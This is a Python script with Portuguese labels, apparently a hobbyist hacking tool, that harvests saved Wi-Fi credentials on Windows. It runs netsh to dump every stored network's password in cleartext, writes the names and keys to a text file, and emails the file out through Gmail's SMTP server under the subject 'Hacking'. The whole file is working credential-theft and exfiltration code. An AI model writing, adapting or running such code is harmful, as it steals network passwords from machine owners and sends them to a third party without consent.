from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
import smtplib, ssl
import subprocess as sp

msg = MIMEMultipart()


redes_wifi = sp.check_output(
    ["netsh", "wlan", "show", "profiles"], encoding='cp860'
    )
for redes in redes_wifi.split('\n'):
    if "Todos os Perfis de Usuários:" in redes:
        pos = redes.find(':')
        qq = redes[pos+2:]

        senhas = sp.check_output(
            ["netsh", "wlan", "show", "profiles", qq, "key", "=", "clear" ], encoding='cp860'
            )
        for password in senhas.split('\n'):
            if 'Nome SSID' in password:
                point1 = password.find(':')
                nome = password[point1+2:]

            if 'Conteúdo da Chave' in password:
                point = password.find(':')
                senha_ = password[point+2:]
                info_rede = f'Rede: {nome}\nSenha: {senha_}\n'
                with open('senhas.txt', 'a') as wifi:
                    wifi.write(f'{info_rede}\n')
                wifi.close()

ADDR = 'email'
msg = MIMEMultipart()
msg['Subject'] = 'Hacking'
msg['From'] = ADDR
msg['To'] = 'email_send_to'

file = open('senhas.txt', 'rb')

att = MIMEBase('application', 'octet-stream')
att.set_payload(file.read())
encoders.encode_base64(att )

att.add_header('Content-Disposition', 'attachment; filename=senhas.txt')

file.close()
msg.attach(att)

context = ssl.create_default_context()

with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
    smtp.starttls(context=context)
    smtp.login(msg['From'], 'password')
    smtp.sendmail(msg['From'], msg['To'], msg.as_string())
    print('Email Send Sucess')


